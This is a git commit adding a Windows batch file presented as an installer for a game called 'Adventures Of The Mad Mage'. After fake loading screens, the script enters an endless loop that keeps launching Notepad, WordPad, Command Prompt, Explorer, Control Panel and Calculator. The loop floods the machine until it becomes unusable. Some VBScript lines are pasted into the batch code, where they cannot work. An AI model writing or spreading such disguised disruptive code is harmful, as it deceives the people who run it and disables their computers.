d09f123753725916d78825d3630384ea15c29bb1
Temez01 <kokinenteme@gmail.com>
2021-11-14 13:16:36 +0200

    Add files via upload

---
+++ Adventures Of The Mad Mage.bat
@@ -0,0 +1,80 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGqM9VA1LCdASReWcm6iA9U=
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+title Adventures Of The Mad Mage
+mode con: cols=100 lines=40
+echo Loading Installer.
+echo game by VesperTheDevourerOfCoffee
+echo @TemezRandomTaco
+timeout /t 2 > nul
+cls
+echo Loading Installer..
+echo game by VesperTheDevourerOfCoffee
+echo @TemezRandomTaco
+timeout /t 2 > nul
+cls
+echo Loading Installer...
+echo game by VesperTheDevourerOfCoffee
+echo @TemezRandomTaco
+timeout /t 2 > nul
+cls
+echo Loading Installer....
+echo game by VesperTheDevourerOfCoffee
+echo @TemezRandomTaco
+timeout /t 2 > null
+cls
+echo installing Assets.
+timeout /t 2 > null
+cls
+echo Adventers Of The Mad Mage
+timeout /t 2 > null
+cls
+echo Wait wrong script
+timeout /t 2 > null
+echo I'm sorry!
+timeout /t 2 > null
+:x
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+Set wshShell = wscript.CreateObject(”WScript.Shell”)
+do
+wscript.sleep 100
+wshshell.sendkeys “~(enter)”
+loop
+goto x
+pause
